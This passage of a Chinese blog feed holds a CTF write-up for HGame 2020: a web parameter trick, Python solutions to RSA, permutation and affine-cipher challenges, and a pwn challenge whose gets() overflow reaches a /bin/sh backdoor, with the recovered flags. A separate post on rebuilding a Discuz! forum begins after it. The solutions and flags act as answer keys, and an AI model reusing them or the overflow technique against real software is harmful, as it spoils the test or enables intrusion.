punctuation">)</span></code></pre><p>curl看了一下之前的网页405。</p><p>嘤不会了。。</p><blockquote><p><strong>20200125更新：</strong></p><p>看了官方WP，发现要把请求改成POST发到原页面。</p><p>于是试了一下，返回</p><pre><code>人鸡验证目前它只支持通过url提交参数来计算两个数的相加，参数为a现在,需要让结果为10</code></pre><p>再构造参数a，根据提示<code>参数a的提交格式为: 两数相加(a=b+c)</code>，考虑到<code>+</code>的Urlencode为%2b</p><p>于是构造<code>/?a=2%2b8</code>，得到flag</p><pre><code>The result is: 10hgame{C0d3_1s_s0_S@_sO_C0ol!}</code></pre></blockquote><hr><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>题目给了如下的代码——</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'hgame{'</span><span class="token punctuation">)</span> <span class="token operator">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>b<span class="token string">'}'</span><span class="token punctuation">)</span>m <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token number">681782737450022065655472455411</span>q <span class="token operator">=</span> <span class="token number">675274897132088253519831953441</span>e <span class="token operator">=</span> <span class="token number">13</span>c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">assert</span> c <span class="token operator">==</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span></code></pre><p>RSA啦。这里就<strong>根据密文C把明文M给找出来</strong>。</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA.png" alt="InfantRSA"></p><pre class=" language-python"><code class="language-python">c <span class="token operator">=</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span>n <span class="token operator">=</span> <span class="token number">460390767897997184102969941508880171690097589571068900519251</span>d <span class="token operator">=</span> <span class="token number">141658697814768364339375366617699419709389378231351875726277</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 得到m为39062110472669388914389428064087335236334831991333245</span><span class="token comment" spellcheck="true"># 再将数字m转换为字符串</span>    <span class="token keyword">import</span> binascii    flag <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>或者 用上面的工具里的<em>Test</em>：</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA2.png" alt="test"></p><p>得到flag：</p><p><code>hgame{t3Xt6O0k_R5A!!!}</code></p><blockquote><p><em>Reference:</em>  介绍RSA的<br><a href="https://www.freebuf.com/articles/others-articles/166049.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/166049.html</a><br><a href="https://www.freebuf.com/articles/others-articles/161475.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/161475.html</a><br><a href="https://www.k2zone.cn/?p=2157" target="_blank" rel="noopener">https://www.k2zone.cn/?p=2157</a></p></blockquote><hr><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p><code>nc 47.98.192.231 25002</code></p><p>敲个回车就可以得到一个乱序的字符串，刚开始还以为是分组来着，然后试了半天不对emmm。</p><p>后来才发现，原来每次的结果都不一样233，比如下面是一些实验结果。</p><pre><code>Rua!!!$hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT   Rua!!!$mtgIUeapjm{h+5LAeT_nTRP!u!m3i0}  Rua!!!t5m{ag+eh$UjILmpT0!mP_iR3ATun}e!  $mhmjI5te+{apUgLAe3!un0TRimP!T_}  mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi  {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3  $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP  5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT  Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R</code></pre><p><strong>既然是乱序吧，那就看看到底是什么个顺序好了！</strong></p><p>上面字符串的长度为32，于是构造字符串 </p><p><code>str1='123456abcdefghijklmnopqrstuvwxyz'</code></p><p>输入后得到 <code>str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo'</code>  </p><p>试了发现该顺序不变，于是得到编码的对应关系（正变换逆变换嘛233333）</p><pre class=" language-python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'123456abcdefghijklmnopqrstuvwxyz'</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span>str2<span class="token operator">=</span><span class="token string">'jhca1346ibdefg25zxsqkmnpyrtuvwlo'</span><span class="token comment" spellcheck="true"># 正变换</span>location<span class="token operator">=</span>list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    location<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20]</span><span class="token comment" spellcheck="true"># 逆变换</span>ilocation<span class="token operator">=</span>list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ilocation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str2<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ilocation<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16]</span><span class="token comment" spellcheck="true"># 验证结果</span>str3<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>    str3<span class="token operator">+=</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str3<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#  jhca1346ibdefg25zxsqkmnpyrtuvwlo</span></code></pre><p>这里用到的是正变换，<strong>暴力破解</strong>一波吧！</p><pre class=" language-python"><code class="language-python">str_encrypted <span class="token operator">=</span> r<span class="token string">'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p>最开始试了50次没出来233，后来把数字改大了一点233.</p><p>终于跑出来了！</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder.png" alt="crypto_Reorder"></p><p><strong>得到flag：</strong></p><p><code>hgame{jU$t+5ImpL3_PeRmuTATi0n!!}</code></p><blockquote><p><strong>果然就排列呗23333</strong></p></blockquote><p>还试了一下，这个130次一循环来着emmm。就这样，发现range改到131就出现两个了。</p><pre class=" language-python"><code class="language-python">str_encrypted <span class="token operator">=</span> r<span class="token string">'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">if</span> str_decrypted<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p><strong>不对唉！</strong>好像没这么简单。重新试了一下之前的几个<code>Rua!!!</code>之后的结果，发现这个变换不可行emmm。</p><p><strong>必须是连续输入上一次出来的结果才行。<em>（可能理解有误</em></strong></p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder2.png" alt="crypto_Reorder2"></p><hr><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>题目给了这段用来加密的代码，现在就想办法还原回去找flag吧。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> secret <span class="token keyword">import</span> A<span class="token punctuation">,</span> B<span class="token punctuation">,</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame{'</span><span class="token punctuation">)</span> <span class="token operator">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span>TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> len<span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        cipher <span class="token operator">+=</span> b    <span class="token keyword">else</span><span class="token punctuation">:</span>        ii <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> MOD        cipher <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># A8I5z{xr1A_J7ha_vG_TpH410}</span></code></pre><p>提示了flag以 <code>hgame{</code> 开头，以 <code>}</code> 结尾，很明显能看出来<code>{ } _</code>这三个字符是找不到而直接加到cipher里的。</p><p>容易得到 MOD=62，于是乎思路就是，<strong>利用  <code>hgame</code> 与 <code>A8I5z</code> 的映射关系，把A和B两个参数给求解出来，再把参数i反解出来，最后把flag还原</strong>。</p><p>码代码吧。</p><pre class=" language-python"><code class="language-python">TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> len<span class="token punctuation">(</span>TABLE<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 62</span>flag <span class="token operator">=</span> <span class="token string">'hgame'</span>cipher <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> b <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    i <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>find<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 求解得到对应的i</span><span class="token comment" spellcheck="true"># h 12</span><span class="token comment" spellcheck="true"># g 11</span><span class="token comment" spellcheck="true"># a 7</span><span class="token comment" spellcheck="true"># m 6</span><span class="token comment" spellcheck="true"># e 18</span>str_encrypt <span class="token operator">=</span> r<span class="token string">'A8I5z{xr1A_J7ha_vG_TpH410}'</span>iis <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>letter<span class="token punctuation">,</span> iis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment" spellcheck="true"># 求解得到对应的ii</span><span class="token comment" spellcheck="true"># A 46</span><span class="token comment" spellcheck="true"># 8 33</span><span class="token comment" spellcheck="true"># I 43</span><span class="token comment" spellcheck="true"># 5 30</span><span class="token comment" spellcheck="true"># z 0</span></code></pre><p>得到了字母对应的i和ii，而<strong>i与ii满足关系 <code>(A*i+B) % 62 = ii</code></strong>，从而可以把A、B解出来。</p><p>查了查<strong>模逆运算</strong>，看了看觉得有点麻烦emmm</p><p>猜想A、B不会太大，干脆直接遍历好了。。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> A <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> B <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">46</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">33</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">43</span> <span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">30</span> <span class="token operator">and</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token operator">*</span>A<span class="token operator">+</span>B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Yes: "</span><span class="token punctuation">,</span> A<span class="token punctuation">,</span> B<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Yes:  13 14</span></code></pre><p>得到A=13，B=14.</p><p>接下来还原flag。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># Begin to decrypt...</span>A <span class="token operator">=</span> <span class="token number">13</span>B <span class="token operator">=</span> <span class="token number">14</span>str_encrypt <span class="token operator">=</span> <span class="token string">'xr1AJ7havGTpH410'</span>str_decrypt <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> letter <span class="token keyword">in</span> str_encrypt<span class="token punctuation">:</span>    ii <span class="token operator">=</span> TABLE<span class="token punctuation">.</span>index<span class="token punctuation">(</span>letter<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">62</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> <span class="token punctuation">(</span>A<span class="token operator">*</span>i <span class="token operator">+</span> B<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">62</span>        <span class="token keyword">if</span> temp <span class="token operator">==</span> ii<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            str_decrypt <span class="token operator">+=</span> TABLE<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypt<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># M4thu5EdiNcRYpt0</span><span class="token comment" spellcheck="true"># So the flag is `hgame{M4th_u5Ed_iN_cRYpt0}`.</span></code></pre><p>这里先把<code>_</code>给去掉了，最后再加上。</p><p>于是乎flag就是：</p><p><code>hgame{M4th_u5Ed_iN_cRYpt0}</code></p><blockquote><p>看来果然是数学啊2333，还想看看大佬们怎么用数学方法解出来的。（（</p><p>如题目所言——  </p><blockquote><p>Some basic modular arithmetic…</p></blockquote></blockquote><blockquote><p><em>Reference:</em> 一点关于模逆运算的介绍，后面有空再看看吧（x</p><p><a href="https://blog.csdn.net/lion19930924/article/details/61926019" target="_blank" rel="noopener">https://blog.csdn.net/lion19930924/article/details/61926019</a></p></blockquote><hr><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>nc 47.103.214.163 20000</p><p>IDA分析一波，发现是memcmp比较，<code>backdoor</code>函数里是执行<code>/bin/sh</code>的。</p><p>其中s与v5距离为 -31h-(-ACh)=123，构造payload发了个<code>"0O0o"</code>过去，发现么得。</p><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+0h] [ebp-ACh]</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Bh] [ebp-31h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+A0h] [ebp-Ch]</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+A4h] [ebp-8h]</span>  v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xA0u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Let's 0O0o\\0O0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token string">"0O0o"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">,</span> <span class="token number">7u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>20200125更新：</strong></p><p>看了官方WP，草（一种植物），好气啊，<code>\x00</code>把字符串识别隔断了。</p><p><img src="/2020/01/23/CTF_Hgame2020/pwn_Hard_AAAAA.png" alt="image-20200125172242766"></p><hr><hr><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a><strong>未完待续</strong></h2><p><em>（可能会咕咕咕</em></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 重建那些年基于Discuz!系统搭建的满是回忆的班级网站</title>
      <link href="/2020/01/09/Idea_RebuildClassWebsite/"/>
      <url>/2020/01/09/Idea_RebuildClassWebsite/</url>
      
        <content type="html"><![CDATA[<p><strong>2020年第一篇哈，先祝大家新年快乐，每天都有新收获喵！</strong>  </p><p>哇呜！今天终于下了今年的第一场雪，贼惊喜~（然而积不起来啊嘤嘤嘤</p><p><br><br></p><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>最近期末考试月忙死了，刚考完一科，难得有空来浪一下。考完一科浪两天然后作死复习的是我了emmm嘤嘤嘤。</p></blockquote><p>有一次和奶冰冰聊天，回忆起之前折腾过的、搭建过的各种网站，而后就想到了N年以前搭建的班级网站。</p><p>（很明显，那时候提供网络服务的各种空间、域名什么的到现在没几个还能用的了。</p><p>2017年10月的时候，我的邮箱突然收到了一封来自Red Hat的邮件，提醒我OpenShift Online v2 <strong>End of Life</strong>了。↓</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life.jpg" alt="End_of_Life" style="max-width:40%;"><p>那时候感觉特别惊喜，毕竟到那时已经放在那上面四五年了，我都差点忘记它的存在了。虽然域名早就炸了，但是这个<em>免费的</em>云平台居然还在（这个角度看来 Red Hat 还是挺可靠的233）。</p><p>那时就登上去看了一下，哇呜数据居然都还在，通过默认的域名还访问到了网站，于是好怀念啊，为了留个纪念就截了个图。</p><blockquote><p>N年前先建了10班的班网论坛，<em>（分班后）</em>又建了个8班的班网。    </p></blockquote><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot2.jpg" alt="img" style="max-width:50%;"><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="img" style="max-width:50%;"><p>​    几天之后，果不其然，<strong>Unavailable了</strong>。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life2.jpg" alt="End_of_Life2" style="max-width:43%;"><p>不过还好那时候就有备份的好习惯（不是），试了几个密码登录进了8班的班网，然后把数据库给备份下来了，不过也只备份了数据库，附件啊头像啊这些就没备份下来。10班的班网（更是由于记不得密码了）就没成功备份emmm。</p><blockquote><p>于是现在就觉得有点遗憾，通过<em>phpMyAdmin</em>其实可以直接导出数据库的；在重建的时候知道通过修改数据库可以把创始人密码修改的。</p><p>但那时候不大清楚这些，也有可能是那时连服务器密码都不记得了（（（</p></blockquote><hr><p>最近这几天就想，干脆试一下，看看能不能重建那时候的班网吧。</p><h2 id="重建折腾记"><a href="#重建折腾记" class="headerlink" title="重建折腾记"></a>重建折腾记</h2><h3 id="辣鸡服务器配置出了一堆问题"><a href="#辣鸡服务器配置出了一堆问题" class="headerlink" title="辣鸡服务器配置出了一堆问题"></a>辣鸡服务器配置出了一堆问题</h3><p>之前都没有自己动手在裸机上配置WEB环境来着，Linux也没有多少经验，于是乎上手就比较痛苦。</p><blockquote><p>下面是一堆废话emmm</p><p><strong>不想看就直接跳过这节吧。</strong></p></blockquote><p>租服务器的时候<em>图省事</em>直接装了<code>PHPStudy</code>，里面集成了<code>LNMP</code>环境，然后网站什么的直接可以在上面配置。</p><p>之前搭了几个测试用的网站，运行都没什么问题，能正常访问。</p><p>然而这次我建了一个新的<code>PHP</code>环境，打开端口，访问的时候居然报<strong>403无权限</strong>，但是其他的网站都没这个问题。</p><p>看到网页上是<code>nginx</code>报的错，很自然怀疑就是它的问题。检查了一下配置没发现问题，于是重装了一下。这回直接报<strong>500内部服务器错误</strong>了。（我愣住了</p><p>看了一下错误log，发现很多是无权限，还有的找不到文件？？？</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/error_log.png" alt=""></p><p>复制粘贴搜了一下，怀疑是动态链接库的问题，于是<code>ln</code>尝试创建链接，然而不成功。</p><p>然后不想管了，关闭<code>nginx</code>服务，启动<code>apache</code>服务，这回还是<strong>403</strong>，其他的网站就没问题，绝了。</p><p>换回<code>nginx</code>，将配置文件中的<code>user</code>由<code>www</code>更改为<code>root</code>，再试居然好了！看来果然是<strong>权限的问题</strong>，然而我之前好像并没有改过什么配置，也不清楚<code>www</code>用户为啥就没权限了。</p><p><code>root</code>毕竟不太安全吧，于是又改了回去，403了。</p><p>登录服务器看了一下，几个网站目录下就只有新建的这个用户组是<code>root</code>，修改了目录权限，允许others执行，再访问，没问题了。</p><p>但很奇怪啊为啥就不行啊。</p><p>于是又重装了一次<code>nginx</code>，同时还卸掉了它的防火墙，这次没问题了emmm。再装回防火墙，又炸了。</p><p>WAF的问题啊。</p><p>这时候后台改参数也有报无权限的，就很懵逼。</p><p>于是干脆直接<code>reboot</code>好了。</p><p><strong><em>（有句话说得好，重启解决绝大部分问题</em></strong></p><p>进入后台，先关闭<code>nginx</code>，重装WAF，再开启<code>nginx</code>。这回终于没毛病了。（x</p><br><hr><h3 id=""><a href="#" class="headerlink" title=""></a><br></h3><h3 id="重建8班班网"><a href="#重建8班班网" class="headerlink" title="重建8班班网"></a>重建8班班网</h3><p>重建其实类似于搬家，于是看了几篇关于<code>Discuz!</code>搬家的教程，发现距今都有一段历史了。</p><p>去官方论坛找到了最新的<strong>X3.4版本</strong>的下载链接，发现指向了gitee，刚开始还觉得有点意思，然而当我点开链接发现连接不上gitee服务器，难道炸了？？？换了一个网络，连上了。（吐槽一下辣鸡宽带，估计是DNS出了点问题8  </p><p><strong>啊不是！！！</strong></p><p>别想着啥都想装最新的，得先考虑你要<strong>重建/恢复的系统是什么版本</strong>的啊！还要注意<strong>PHP的版本</strong>，以及<strong>语言编码（GBK/UTF8/BIG5/？）</strong>（就因为这个删掉又重建了好几个版本</p><p>论坛的版本可以在你备份的数据库<code>.sql</code>文件头部注释里看到。（这个还是后面重建10班班网时才发现的</p><p>不要像我一样装了发现用不了嘤嘤嘤。</p><ul><li><code>upload</code>文件夹打包传到服务器上，解压，然后访问网站。</li></ul><blockquote><p>草怎么又403了。</p></blockquote><blockquote><p>检查了一下文件发现是root所属，原来是之前一直以root身份操作的问题，更改用户组为<code>www</code>，这回能正常访问了。</p></blockquote><ul><li>按照安装流程全新安装<code>Discuz!</code>系统。这里的数据库要自己提前建好，表前缀和你要重建的一致，一般就不用更改。  </li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot1.png" 